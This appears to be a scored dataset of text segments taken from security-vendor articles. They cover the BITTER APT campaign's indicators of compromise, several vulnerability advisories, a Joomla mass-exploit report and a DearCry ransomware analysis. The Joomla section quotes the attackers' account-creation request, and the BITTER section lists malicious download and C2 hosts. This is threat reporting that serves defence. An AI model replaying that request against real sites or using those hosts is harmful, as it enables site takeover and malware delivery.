"While it is hard to conclude based only on these artifacts, the nature of these targeted file types suggests that the attackers may be after sensitive documents.",0.014082315570394743
Other Tools Used,0.010727146059613113
"In December 2015 one of the campaign's download sites hosted a binary at scholars90[.]website/putty. The downloaded file is a free SSH and Telnet client application called ""PuTTY"", which has been used in the past in other targeted attacks.",0.010902771620947771
"In addition, the same RAT variant previously mentioned (SHA1 3ab4ce4b3a44c96d6c454efcece774b33335dda2) connects to the C2 info2t[.]com/m2s.php​. This has also served as a C2 for at least two AndroRAT variants in the past. The following diagram shows these relationships:",0.01074311139044104
AndroRAT is an open source remote administration tool for Android. Its GitHub repository lists the following capabilities:,0.012204319379009343
Get contacts (and all theirs informations),0.01707365347398937
Get call logs,0.009762712737607426
Get all messages,0.00925284595100484
Location by GPS/Network,0.01201364920292336
Monitoring received messages in live,0.010702621308197102
"Monitoring phone state in live (call received, call sent, call missed..)",0.016248337164632365
Take a picture from the camera,0.008585003860299367
Stream sound from microphone (or other sources..),0.008804678755830131
Streaming video (for activity based client only),0.01571935013993475
Do a toast,0.008234382757799086
Send a text message,0.009249116627855103
Give call,0.009122616960960062
Open an URL in the default browser,0.0066714994471306355
Do vibrate the phone,0.009282488726968907
"The AndroRAT variant with SHA1 7d47ae3114f08ecf7fb473b7f5571d70cf2556da disguises itself as the Islam Adhan Alarm - an Android app that alerts to prayer times of Islam, which is the state religion of Pakistan. The variant with SHA1 645a6e53116f1fd7ece91549172480c0c78df0f, on the other hand, disguises itself as Kashmir News app. Kashmir is the northernmost geographical region of South Asia and is a disputed territory between India and Pakistan.",0.014527733885859928
Protection Statement,0.009481584346963334
Stage 2 (Lure) - Spear-phishing e-mails associated with this attack are identified and blocked.,0.012026772084222315
Stage 5 (Dropper File) - Related RATs are prevented from being downloaded.,0.01039070603760317
Stage 6 (Call Home) - Communication between the RAT and command and control are blocked.,0.012370715069368043
Conclusion,0.008171308922719556
"Many targeted attacks continue to be discovered today. It is interesting to see that while these attacks are not always sophisticated in nature, the same characteristic allows them to stay under the radar by blending in with common attacks in the wild. BITTER is able to achieve this by using available online services such as free DDNS, dedicated server hosting and Gmail to setup their C2s. Such setup is exhibited by today's common malware.",0.014626933853057023
"It is worth noting that in all the artifacts collected in this research, none of the English words that were used had spelling errors, suggesting that the actors behind BITTER are proficient in the English language. Furthermore, as discussed above, all the artifacts we have seen are consistent with Pakistan being the target of this group. There may be other targets that have not been discovered yet or BITTER may be a branch of a larger campaign with broader targets, but only time will tell whether any of these are correct.",0.019006156060668356
Indicators of Compromise,0.0076996116119932845
RAT (SHA1),0.013825188851772419
"42cdfe465ed996c546c215a8e994a82fea7dc24c
3ab4ce4b3a44c96d6c454efcece774b33335dda2
1990fa48702c52688ce6da05b714a1b3e634db76
93e98e9c4cf7964ea4e7a559cdd2720afb26f7f7
c3a39dc22991fcf2455b8b6b479eda3009d6d0fd
37e59c1b32684cedb341584387ab75990749bde7
52485ae219d64daad6380abdc5f48678d2fbdb54
137a7dc1c33dc04e4f00714c074f35c520f7bb97
e57c88b302d39f4b1da33c6b781557fed5b8cece
0172526faf5d0c72122febd2fb96e2a01ef0eff8
e7e0ba30878de73597a51637f52e20dc94ae671d
fa8c800224786bab5a436b46acd2c223edda230e
c75b46b50b78e25e09485556acd2e9862dce3890
72fa5250069639b6ac4f3477b85f59a24c603723
f898794563fa2ae31218e0bb8670e08b246979c9
2b873878b4cfbe0aeab32aff8890b2e6ceed1804
d7a770233848f42c5e1d5f4b88472f7cb12d5f3d
ddf5bb366c810e4d524833dcd219599380c86e7a
23b28275887c7757fa1d024df3bd7484753bba37
6caae6853d88fc35cc150e1793fef5420ff311c6
1a2ec73fa90d800056516a8bdb0cc4da76f82ade
ff73d3c649703f11d095bb92c956fe52c1bf5589",0.0294873381602766
RAT Dropper (SHA1),0.015273889830523135
"c0fcf4fcfd024467aed379b07166f2f7c86c3200
0116b053d8ed6d864f83351f306876c47ad1e227
4be6e7e7fb651c51181949cc1a2d20f61708371a
998d401edba7a9509546511981f8cd4bff5bc098
21ef1f7df01a568014a92c1f8b41c33d7b62cb40
c77b8de689caee312a29d30094be72b18eca778d",0.016823875966759716
AndroRAT (SHA1),0.015236441810881796
"7d47ae3114f08ecf7fb473b7f5571d70cf2556da
645a6e53116f1fd7ece91549172480c0c78df0f",0.011187963361253939
RAT download sites,0.008319192366825434
"kart90.website/sysdll
range7.com/svcf.exe
scholars90.website/ifxc
scholars90.website/ifxc
scholars90.website/cnhost.exe
kart90.website/cnhost
frontier89.website/wmiserve
reloadguide71.com/winter/iofs
creed90.com/ismr
wester.website/uwe
chinatel90.com/min
wester.website/nqw
scholars90.website/splsrv",0.014953207507009236
RAT C2s,0.008829526502437846
"ranadey.net78.net/Muzic/exist.php
info2t.com
range7.com/m2s_reply_u2.php
www.queryz4u.com
www.sportszone71.com/games/hill.php
micronet.no-ip.co.uk
www.inspire71.com/warzone/hill.php
spiralbook71.com/warzone/hill.php
govsite.ddns.net
randomvalue90.com/warzone/hill.php
marvel89.com/ahead.php
cloudupdates.servehttp.com
pickup.ddns.net
marvel89.com/msuds.php
updateservice.redirectme.net
pickup.ddns.net
destiny91.com/truen/adfsdsqw.php
medzone71.com/medal/adfsdsqw.php
nexster91.com/winter/war.php
",0.016530530523489073
What you need to know about the Bash “Shellshock” vulnerability,0.008633423470814194
"Written by
Editor",0.007990427730288352
"September 25, 2014",0.008497712871426977
Network Partners Products & Services Server Support Bash Shellshock Vulnerabilities,0.007484464238251554
"In the light of the recent Bash vulnerability known as “Shellshock” (CVE-2014-6271 and CVE-2014-7169), here’s the reality instead of the hype.
Shellshock is a newly-discovered vulnerability in Bash (the Bourne Again Shell), one of the most commonly used shells on Linux, UNIX and OS X.
Although it can be exploited in some cases, the good news is that not all implementations can be exploited, and only certain services and applications allow a hacker to exploit this issue.",0.011561903458110923
"See our articles and other resources on Naked Security and at sophos.com/shellshock for an explanation of the vulnerability itself.
In addition, we have examined our products and we are confident that the Shellshock vulnerability can’t be exploited in any Sophos product.
As far as we’re aware, we don’t have any servers or services that could have been exploited due to his bug. This includes our internal business systems, Sophos web servers, update servers, partner portal and support forums.
For the latest information on how this bug affects Sophos products, please refer to our knowledgebase article from Sophos Support.",0.01113869506012155
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"1
",0.011966970221767848
"A week in security (September 24 – 30)
Last week on Labs was a busy one. We discussed how SMS phishing attacks target the job market, issued a warning for TV Licensing phishes, commented on how Apple confused Safari users with recent changes to how OSX handles browser extensions, and elaborated on holes found in Mojave’s privacy protection—deep breath! We also showed how a buggy implementation of CVE-2018-8373 vulnerability is used to deliver Quasar RAT, discussed what is needed to fight back in the age of unwanted calls, gave some tips on how to protect your data from Magecart and other e-commerce attacks, and alerted our readers that millions of accounts were affected in the latest Facebook vulnerability.
Other cybersecurity news:",0.011506866459475185
"Tech firms back US privacy law to negate states. (Source: The Washington Post)
Microsoft rolls out confidential computing for Azure. (Source: Bleeping Computer)
Google recently made a change to simplify the way Chrome handles sign-in. (Source: The Keyword)
VirusTotal announces VirusTotal Enterprise. (Source: medium.com)
14 years imprisonment for man who helped hackers evade detection by antivirus software. (Source: Hot for Security)
Port of San Diego’s information technology systems disrupted by ransomware. (Source: Port of San Diego)
LoJax: the first UEFI rootkit found in the wild, courtesy of the Sednit group. (Source: WeLiveSecurity}
Telegram leaks public/private IP addresses of end users in desktop. (Source: inputzero)
iPhone XS passcode bypass hack exposes contacts and photos. (Source: ThreatPost)
Secret Service warns of surge in ATM ‘wiretapping’ attacks. (Source: Krebs on Security)
Mutagen Astronomy: Linux kernel ‘give me root, now’ security hole sighted. (Source: TheRegister)",0.011811434030799206
"Stay safe, everyone!
",0.011913018809127096
"Patch now! Microsoft fixes over 50 serious security flaws
This week saw the second Tuesday of the month, and everyone who is responsible for protecting Windows computers knows what that means: another bundle of security patches have been released by Microsoft.",0.018195961440300557
Graham Cluley,0.010131928644261823
14 Feb 2018 - 03:30PM,0.011219319740531808
"This week saw the second Tuesday of the month, and everyone who is responsible for protecting Windows computers knows what that means: another bundle of security patches have been released by Microsoft.",0.018996925795267683
"This week saw the second Tuesday of the month, and everyone who is responsible for protecting Windows computers knows what that means: another bundle of security patches have been released by Microsoft.",0.018996925795267683
"This month’s “Patch Tuesday” included security updates for Internet Explorer, Microsoft Edge, Microsoft Windows, Microsoft Office, Adobe Flash Player, and other software, tackling over 50 security vulnerabilities.",0.019167552647033737
"The most serious security patches have been given Microsoft’s highest severity ranking of “critical”. That means that Microsoft’s security team believes that the flaws could be remotely exploited by malicious hackers, often to plant malware designed to hijack targeted computers without user interaction.",0.00853790298923185
One of the most worrying security holes addressed by the patches is a memory corruption bug in Outlook (CVE-2018-0852) that could allow an attacker to remotely trick your computer into running malicious code.,0.010865977012809891
"The attack can be triggered by opening a boobytrapped attachment, visiting a poisoned webpage, or simply viewing a malicious message in Outlook’s preview pane.",0.010973626437173145
Here is Microsoft describing how a hacker could exploit the flaw:,0.007306260242292084
"Exploitation of the vulnerability requires that a user open a specially crafted file with an affected version of Microsoft Outlook software. In an email attack scenario, an attacker could exploit the vulnerability by sending the specially crafted file to the user and convincing the user to open the file. In a web-based attack scenario, an attacker could host a website (or leverage a compromised website that accepts or hosts user-provided content) that contains a specially crafted file designed to exploit the vulnerability. An attacker would have no way to force users to visit the website. Instead, an attacker would have to convince users to click a link, typically by way of an enticement in an email or instant message, and then convince them to open the specially crafted file.",0.016019936918031386
"Although there is no evidence yet that malicious hackers are exploiting this Outlook flaw, the fact that a computer can be compromised via the preview pane makes it particularly threatening. Patching, therefore, should be a priority.",0.01045770047808392
"A series of other critical security holes have been found in Edge and Internet Explorer, which could allow remote code execution just by visiting a malicious webpage.",0.011892406102181563
"There’s no doubting Microsoft’s desire to fix as many vulnerabilities as it can with its monthly patch bundle, but there’s at least one recently-disclosed serious security hole in a Microsoft product that has not been addressed this time.",0.010443577713519558
"Last September, security researcher Stefan Kanthak told Microsoft about a flaw in how the Skype desktop app updates itself which could be exploited to allow an unprivileged user to escalate themselves to full “system” level rights, giving them God-like rights over the computer.",0.013488917062507877
"Microsoft confirmed to Kanthak that it was able to replicate the problem, but told him that it would not be fixed until a new version of the software was released, rather than via a security update, due to the “large code revision” required.",0.009654769767739935
And there’s one other possible wrinkle in your security blanket.,0.014431098608134962
"Last month Microsoft warned that some security products were incompatible with its mitigation against the Meltdown CPU flaw, and as a result would not receive any further Microsoft patches until those products certified that they would not cause problems.",0.018119106042339794
"Fortunately most of the major anti-virus products are now compliant, and ESET customers – for instance – don’t have anything to worry about, as their security products are compatible with Microsoft’s patch for the Meltdown Intel Flaw).",0.013125193722492656
"Obviously it’s a good idea to update your computer systems at your earliest convenience. Backing up essential systems before applying the patches is advisable, just in case something goes wrong. And if it’s not convenient, maybe now is the time to make sure it *is* convenient in future.
",0.013241965213348639
OpenSSL Man-in-the-Middle vulnerability: Sophos Product Status,0.009681065718096349
"Written by
Chris Weeds",0.008488617986944558
"June 10, 2014",0.008336890795314966
Cloud Network Products & Services Security Tips,0.00954688449136376
"On June 5th 2014, multiple new OpenSSL vulnerabilities were disclosed including CVE-2014-0224. Like the recent Heartbleed vulnerability this is a serious bug in the software responsible for encrypting traffic on the internet and is a widespread issue. Users are advised to ensure that their solutions are fully patched to protect against this bug. Fortunately, at the time of writing, there are no known in-the-wild attacks.",0.00992515117486148
"The CVE-2014-0224 vulnerability
This newly discovered vulnerability is linked to a flaw in the origin of the code in 1998. Almost all versions of OpenSSL are vulnerable, and if they are exploited it can result in communications being disclosed to a man-in-the-middle attack. However, the flaw relies on both the client and the server running vulnerable versions of OpenSSL and the server version being 1.0.1 or higher to be exploited. For more information on this threat, read our Naked Security article.
Sophos product status
Having audited all our solutions, we believe that only the below products are affected. We are working on fixes for all of them with the highest priority:",0.011202670581690222
"Sophos Cloud
Sophos UTM v9.2
Sophos UTM v9.1
Sophos UTM v8.3
SUM v4.1/4.2
Sophos Web Appliance v3.9.x.x
Sophos Email Appliance v3.7.x.x
PureMessage for UNIX",0.016081368107245808
"For further information on affected Sophos products, including patch availability, read the Knowledgebase article.
Many security products include OpenSSL for cryptographic functions and may also be vulnerable. Check with all of your security providers to be sure these flaws are being addressed.
How to stay secure
1. Patch early, patch often
A wide range of organizations are affected by this issue. Many programs will be issuing updates over the coming weeks. Watch out for the patches and apply them as soon as you can. As general best practice we always recommend ensuring your solutions are fully patched and up-to-date.
2. Always use a VPN and don’t trust open WiFi hotspots
In order to perform a man-in-the-middle attack the aggressor needs to be between you and the server you are communicating with. For most of us, this means we are most vulnerable when using unencrypted public WiFi. To avoid putting yourself at risk always use a VPN or a secure WiFi connection for important communications.",0.01207607395508592
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"1
",0.011966970221767848
"Microsoft Internet Explorer zero day flaw will be even worse for XP users
Microsoft announces a zero-day security flaw in many versions of Internet Explorer, the first to hit Windows users since XP support was terminated on April 8, potentially crippling IE on XP systems.",0.017091467427116314
Rob Waugh,0.00889544393546926
28 Apr 2014 - 01:45PM,0.011498523982881648
"Microsoft announces a zero-day security flaw in many versions of Internet Explorer, the first to hit Windows users since XP support was terminated on April 8, potentially crippling IE on XP systems.",0.01635950785377338
"This weekend Microsoft announced a serious vulnerability in its browser, Internet Explorer, a zero-day remote code execution hole, formally indexed as CVE-2014-1776. This vulnerability affects IE versions 6 through 11. You can read the details of the release from Microsoft here and also here. According to ESET security researcher Stephen Cobb, the safest response to this vulnerability is to use an alternative browser until IE is patched, regardless of which operating system you are using.",0.007909695129002081
"Noting that media coverage of the vulnerability has been extensive, partly because it is the first serious security flaw to affect Windows XP users after Microsoft ended support for the 12-year-old operating system on April 8, Cobb warns, “the XP angle to this news should not lead organizations to under-estimate the scope of this vulnerability.”",0.010472567650330888
"The flaw, which affects all versions of Internet Explorer from 6 to the latest version, 11, could let attackers assume full control over affected machines, according to The Verge’s report. The Verge points out that while users on a modern version of Windows will likely see a patch in a few weeks’ time, XP users will not.",0.012154697556474137
"In a post, Microsoft said, “Microsoft is aware of limited, targeted attacks that attempt to exploit a vulnerability. The vulnerability is a remote code execution vulnerability. The vulnerability exists in the way that Internet Explorer accesses an object in memory that has been deleted or has not been properly allocated.”",0.008054530392433978
"Microsoft’s TechNet said that the vulnerability would either be fixed in one of the company’s monthly security updates, or via an out-of-cycle update. In other words: the vulnerability is currently not fixed.",0.009361628357657081
"ESET Senior Research Fellow David Harley offers the following advice, “Don’t panic: the known attacks around at present are limited in scope and volume. Being reasonably careful about which sites you visit is in itself likely to reduce the risk. On the other hand, don’t lapse into complacency.",0.010406732681792374
"“Setting IE Active Scripting and ActiveX to prompt is mildly irritating (or very irritating, if you’re a Facebook user), but seems to reduce the attack surface if you actually disallow it on prompt unless you know you need it. Or try disabling it altogether. The simplest route is just to set IE security levels to ‘high’, or use Enhanced Protected Mode in IE versions that support it.”",0.01148536916408971
"“If you’re using XP, you should probably be setting IE security level to ‘high’ already, as a way of generally decreasing the attack surface on an unsupported OS. Or using a browser that is less affected by the currency/obsolescence of the operating system. Which is probably a good thing to do irrespective of the OS you happen to be using.”",0.012902580924977314
ESET’s KnowledgeBase also has advice on dealing with Microsoft Internet Explorer remote code execution hole (CVE-2014-1776).,0.015721672898645345
"Veteran security writer and researcher, and We Live Security contributor Graham Cluley wrote, “You as a user don’t have to do anything odd to get your Windows computer infected by malware spread via this exploit. All you need to do is visit a website that has been poisoned by the hackers using a version of Internet Explorer.”",0.01100818308423368
"“What you won’t find any mention of in Microsoft’s warning, notably, is Windows XP. That’s not because it’s immune to attack. It’s because, Microsoft released its last ever security patches for Windows XP on April 8 2014. If you are still running Windows XP you will never receive a patch for this zero-day vulnerability.”",0.009134797260483163
"The Wall Street Journal’s Digits blog said that while it was not a surprise that a vulnerability had been found in the dozen-year-old Windows XP, it was a surprise that one had appeared within weeks.",0.012801988848553547
"Digits speculated that Microsoft might make an exception and patch the vulnerability, but said that Microsoft were not available for comment.
",0.014682341251842423
Joomla Exploits in the Wild Against CVE-2016-8870 and CVE-2016-8869,0.008598053449008658
"Exactly 3 days ago, the Joomla team issued a patch for a high-severity vulnerability that allows remote users to create accounts and increase their privileges on any Joomla site. Both issues combined give the attackers enough power to easily upload backdoor files and get complete control of the vulnerable site.
A few hours after the patch was released, we were able to reverse-engineer it. We created an internal-only tool that allowed us to exploit the vulnerability and upload a backdoor. Marc explained the technical details in yesterday’s post. His research allowed us to understand how attackers could potentially abuse the vulnerability and what we would need to do to update the virtual patching rules in our cloud Firewall to keep our customers protected.
However, we were not the only ones performing this research. Less than 24 hrs after the initial disclosure, we started to see tests and small pings on some of our honeypots trying to verify if this vulnerability was present.
In less than 36 hrs after the initial disclosure, we started to see mass exploit attempts across the web. In fact, because of the sharp increase, it’s our belief that any Joomla! site that has not been updated is most likely already compromised.
Phase 1: Initial Pokes
The first attacks started at around 1pm UTC on the 26th, less than 24 hrs after the initial disclosure by the Joomla team. Most of them were looking for the user.register tasks and trying to create users. They were especially targeting some of the most popular Joomla sites.
This is how the payload would look in your web logs:
POST /index.php?option=com_users&task=user.register HTTP/1.1""
Phase 2: First Mass Exploits
A few hours later, at around 8pm UTC, a couple of IPs from Romania started a mass attack against thousands of different Joomla sites. In all of them, they tried to create a username called db_cfg with the password fsugmze3. They were going to the same URL with a payload that looks like:
82.77.15.204 - - [26/Oct/2016:18:09:24 -0400]
""POST /index.php/component/users/?task=user.register
user[name] = db_cfg
user[username] = db_cfg
user[password1] = fsugmze3
user[password2] = fsugmze3
If your site was not updated in time, look for the db_cfg username on your site as you are likely to have been hacked already. You can also look for these 3 IP addresses in your log:
82.76.195.141
82.77.15.204
81.196.107.174
They were the ones doing this initial mass exploitation campaign. Shortly after, another IP address from Latvia started a similar mass exploit campaign trying to register random usernames and passwords on thousands of Joomla sites. The only similar pattern for this Latvia IP address was the email: ringcoslio1981@gmail.com.
So we have another IP to look for in your logs:
185.129.148.216
Both campaigns kept running strong through the 26th and 27th attempting to compromise every Joomla site we were watching, including our Honeypots.
Phase 3: Public Knowledge
After these initial mass exploits, multiple researchers and security professionals started to share different exploits for this attack. Some of them are even automating the upload of backdoors and using some unique techniques to bypass the media uploader (using .pht files).
That led to a massive increase in IP addresses trying to exploit this vulnerability using different patterns and techniques.
This is the graph of exploit attempts against this vulnerability since the disclosure:
Rate of Joomla infections since vulnerability disclosure.
… And that’s just based on the number of sites for which we have visibility.
Likely Already Compromised
If you have not updated your Joomla site yet, you are likely already compromised. Every Joomla site on our network was hit (and blocked by the Sucuri Firewall) and I assume pretty much every site out there suffered the same way.
I still recommend updating your site ASAP and checking for any new users in your dashboard. Also look for the provided IP addresses in your logs, along with the task=user.register pattern. If you find yourself in a situation where you have been compromised we have a new guide on how to clean a hacked Joomla site that you can follow. If you are unable to do it yourself we can help with the incident response.
",0.01862007409358213
UTM Up2Date 9.209 Released,0.00861414161441254
"Written by
Eric Bégoc",0.010229904213713614
"October 23, 2014",0.008586117196800247
Network up2date UTM UTM 9,0.01007005226623292
"A new Up2Date package for Sophos UTM is available as of today.
This update will disable SSLv3 support for many services to eliminate the risks from CVE-2014-3566 (POODLE).
Furthermore, we have introduced some additional fixes and improved the Up2Date client in anticipation of the ucoming 9.3 release.",0.012136260482256689
"Sophos UTM 9.209 – Details
News",0.009437551210296546
"Security Release
Disable SSLv3 support in many services to remove vulnerability to SSLv3 protocol vulnerability (“POODLE”, CVE-2014-3566)
Improve Up2Date client support for staged rollout of 9.3.
Updating to 9.209 will be required to be able to download the 9.2 to 9.3 Up2Date.",0.011517461287692154
Remarks,0.009780636038266843
System will be rebooted,0.007758715382572667
Bugfixes,0.009816324567177737
"32930 Kernel Panic in 9.206 RIP nf_nat_setup_info+0x209/0x652 [nf_nat]
33159 Timezone update needed for Russia [v9]",0.008286954458956886
"Up2date link:
ftp://ftp.astaro.de/UTM/v9/up2date/u2d-sys-9.208008-209008.tgz.gpg",0.009984320006541147
"Up2date MD5sum:
bb4f70cdf89535dff15ff708c14f8354",0.009842514977280725
"File size:
≈32MB",0.00805394794344394
"Up2Date Installation:
Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.
There are two ways to apply an already-downloaded Up2Date package to the system:",0.013772033919475235
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you).
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.015233574152306972
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Cybercriminals are currently spamvertising a malicious email campaign that’s designed to trick you into clicking on a bogus complaint.pdf link which ultimately leads to client-side exploits and malware.
The campaign is launched by the same gang that launched the “Spamvertised ‘Termination of your CPA license’ ” malicious campaign last month.",0.012786667963241571
More details:,0.008320251094065867
"Spamvertised subjects: Your accountant license can be revoked; Rejection of your tax appeal; Fraudulent tax return assistance accusations; Tax return fraud notification; Internal Revenue service notification; Income tax return fraud accusations
Spamvertised message: We have received a complaint about your possible participation in income tax refund infringement on behalf of one of your clients. According to AICPA Bylaw Paragraph 765 your Certified Public Accountant status can be revoked in case of the aiding of submitting of a misguided of fraudulent tax return on the member’s or a client’s behalf.
Please familiarize yourself with the complaint below and provide your feedback to it within 14 days. The failure to provide the clarifications within this term will result in withdrawal of your CPA license.
Spamvertised URL: hxxp://www.inductiveminds.com/wp-includes/aic.html
Upon clicking on the link, end and corporate users are exposed to a mix of client-side exploits that ultimately drop malicious software on the targeted hosts. In this case,  the campaign attempts to exploit Libtiff integer overflow in Adobe Reader and Acrobat (CVE-2010-0188), and Help Center URL Validation Vulnerability (CVE-2010-1885), ultimately dropping malware with MD5:0e8ca3f42bc4cc8df8acccb8a4d4af67.
Avoid interacting with these emails. Report them as malicious as soon as possible, and also ensure you’re using the latest version of your third-party software and browser plugins when you browse the Web.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.010349575252969867
DearCry ransomware attacks exploit Exchange server vulnerabilities,0.009084342077347762
"Perhaps not by coincidence, the ransomware's file encryption methodology mimics that of WannaCry.",0.018059118532954277
"Written by
Mark Loman",0.008668015260164808
"March 15, 2021",0.009800701894462804
SophosLabs Uncut Threat Research CVE-2021-26855 CVE-2021-27065 DearCry Hafnium ProxyLogon Ransomware WannaCry,0.012970374053067002
"A  recently-patched set of vulnerabilities in on-premises versions of Microsoft Exchange Server has been actively exploited for over two months. The exploit, initially attributed to a Chinese state-sponsored actor, has now been adopted for a range of cybercrime activities—the latest being a ransomware called DearCry.  Sophos recently detected and stopped a DearCry attack using the exploit, and obtained samples for analysis.
The DearCry ransomware appears to be created by a beginner—it is unsophisticated, and does little to hide itself from detection. Its most notable feature is that the encryption header that DearCry adds to the attacked files looks similar to the header used by the notorious WannaCry ransomware, which seems more than a coincidence.
The exploit
The bugs leveraged in the exploit—CVE-2021-26855 and CVE-2021-27065—were uncovered and reported to Microsoft in December by researchers at DEVCORE. On New Year’s Day, the DEVCORE researchers chained the bugs together and created a workable pre-authentication remote code execution exploit they dubbed “ProxyLogon,” as it exploits bugs in Exchange’s  proxy architecture and logon mechanism .
DEVCORE contacted the Microsoft Security Response Center through its MSRC portal on January 5, 2021, with a 120-day public disclosure deadline. On February 18, MSRC confirmed the bug would be fixed in the March 9 “Patch Tuesday” release. But Microsoft was prompted to make an out-of-band patch release on March 3  after the memory analysis and incident response company Volexity reported in-the-wild exploitation.
According to Volexity, in-the-wild exploitation appears to have started as early as January 6, 2021—the day after the proof-of-concept was submitted to Microsoft. Volexity observed the attacker writing webshells (ASPX files) to disk and conducting further operations to dump credentials, add user accounts, steal copies of the Active Directory database, and move laterally to other systems and environments. Microsoft Threat Intelligence Center (MSTIC) attributed this campaign with high confidence to HAFNIUM, a group assessed to be state-sponsored and operating out of China, based on observed victimology, tactics and procedures.
After investigation, DEVCORE confirmed that the in-the-wild exploit observed by Volexity was the same one  DEVCORE submitted to Microsoft. The exploited path in the exploit attacks is similar (/ecp/<single char>.js) and the webshell password is “orange” (hardcoded by DEVCORE exploit developer Orange Tsai @orange_8361).
Sophos first detected  and blocked a DearCry attack on a customer’s network in Austria on March 13.  A few days earlier, on March 11, the same Exchange server was hit with a webshell, which was also blocked.
DearCry
The anti-ransomware team within SophosLabs evaluated two samples of DearCry for this analysis. In both cases, the binaries were unsigned, and showed no evidence of version control or other professional development practices. The binaries had no defense against anti-virus signatures—they were not packed or obfuscated, so all ransomware text strings are in plain sight for detection by analysts and signature-based malware protection. The absence of these characteristics leads us to believe that  the ransomware author is a beginner, or that this is an early prototype.
Both samples contained an identical PDB reference to the machine and source file used to compile the malware binary:
C:\Users\john\Documents\Visual Studio 2008\Projects\EncryptFile -svcV2\Release\EncryptFile.exe.pdb
Each binary appeared to be created specially to be delivered to the victim. DearCry uses a fully standalone encryption method, with the public key embedded within the ransomware binary, so it does not have to contact a C2 server in order to begin encrypting files. The two samples we studied were sent to different victims, and had different unique identifiers in their ransom notes, and used different keys.
Crypto combo
Before encrypting a file, DearCry first creates a new file with a filename based on the name of the document it attacks, but adds a .CRYPT file extension. Once created, DearCry starts reading contents of the original file and writes it back, encrypted, into the .CRYPT file.
There are two different encryption methods used by DearCry.  Files are encrypted using the AES-256 symmetric encryption algorithm, using an OpenSSL library embedded in the ransomware.
OpenSSL code embedded in the DearCry binary
But the AES key itself is encrypted by the attacker with an RSA public-key algorithm. A public key for decrypting the AES key is embedded in the code, but the private key is retained by the attacker.  Using the RSA encryption of the AES key allows the actor to deploy the ransomware without needing a command and control server to deploy the key. And the DearCry actor can create a ransomware binary for each victim, with a unique, victim-specific public encryption key. However, based on our findings, the actor has attempted to deliver the same binary to multiple victims.
Interestingly, the list of file-types the ransomware targets can differ per victim. For example, popular image files (like JPG), CAD drawings, programs (EXE) and dynamic link libraries (DLL) were not targeted in sample 1, which seems earlier distributed according to the compiler timestamp. Most other ransomware families exclude programs and DLLs from their list of encryption targets, because encrypting the wrong files can result in the computer becoming unbootable, which makes it much harder for the victim to read the ransom note.
Looking at these file types, DearCry also targets ASPX files. This would mean the attacker could encrypt an Exchange webshell that allowed hands-on-keyboard from remote. This leads us to believe that the ransomware may not be deployed via a webshell, or that the attacker has no interest in keeping webshell-access. The later variant (sample 2) also targets installed software, i.e., EXE and DLL files, effectively making the machine useless:
DearCry ransomware encrypting applications and DLLs, preventing them from running.
DearCry and WannaCry
Intriguingly, the encryption header that DearCry adds to the attacked files looks similar to the header used by the notorious WannaCry – a  ransomware worm that shook the cyber-realm in May 2017.
Compare the encryption header and file type and size codes added by DearCry ransomware to a file…
…to a version of the same file, encrypted by WannaCry ransomware
The above two images compare an encrypted file Desert.jpg, a sample picture from a default Windows 7 machine. Both DearCry and WannaCry add their name at the beginning of the file. Furthermore, in WannaCry the highlighted parts represent file type and the size of the original unencrypted file. File type at offset 0x010C and file size at offset 0x0110.
Code in DearCry writing the header in format similar to WannaCry (with  comments added for clarification).",0.01602979926475334
"The hybrid approach
From an anti-ransomware perspective, looking at DearCry’s file system behaviors reveals more interesting details. The following table illustrates its behavior for each file DearCry attacks (these can be observed using Process Monitor):
File system behavior of DearCry. Step 8 = Copy. Step 10 = In-Place.
From this behavior, DearCry is what we’d normally call a Copy ransomware. It creates encrypted copies of the attacked files and deletes the originals. This causes the encrypted files to be stored on different logical sectors, normally allowing victims to recover maybe some data – depending on whether Windows reuses the freed logical sectors.
Compared to DearCry, more notorious human-operated ransomware like Ryuk, REvil, BitPaymer, Maze and Clop, are In-Place ransomware, where the attack immediately causes the encrypted file to be stored on logically the same sectors as the original document, making recovery via undelete tools impossible.
But DearCry has an added trick to make recovery impossible. Before deleting the original document and after closing the encrypted copy, it also overwrites the original document. This means DearCry has a hybrid encryption approach: it performs both a Copy and In-Place encryption attack.
DearCry overwriting the original document after making its encrypted copy.
Original Desert.jpg overwritten by DearCry
This approach is not common. It is so uncommon, the only ransomware that comes to mind that also employed a hybrid approach was WannaCry. It also first created an encrypted copy and then overwrote the original file to prevent recovery:
File system behavior of WannaCry. Step 8 = Copy. Step 13 = In-Place.
Details about file system behaviors of notorious ransomware, including WannaCry, are documented in our How Ransomware Attacks whitepaper.
These attributes don’t directly link DearCry to WannaCry’s creator. DearCry’s code, approach and abilities differ significantly from WannaCry: it does not use a command-and-control (C2) server, has an embedded RSA encryption key, shows no user interface with a timer and – most importantly – does not spread itself to other machines on the network.  And the DearCry ransomware binary itself does not delete volume shadow copies.
Ransom notes
To inform victims about what happened and who they must contact, a file ‘readme.txt’ is dropped in every folder containing the word ‘desktop’ and in the root folder of the system disk. This ransom note contains two e-mail addresses and a hash. This hash is an identifier, so the attacker knows what decryption key is associated with the specific attack.
DearCry ransom note.
Detections
Sophos customers may see DearCry detected as Troj/Ransom-GFE. In some circumstances, the endpoint protection tools on affected Exchange servers also detected a web shell dropped a couple of days before the ransomware; Those components will be reported as Troj/WShell-A.
Specific indicators for the samples described herein have been published to the SophosLabs Github.
Acknowledgments
SophosLabs would like to acknowledge the contributions of Alex Vermaning and Fraser Howard to this report.",0.02139049204491006
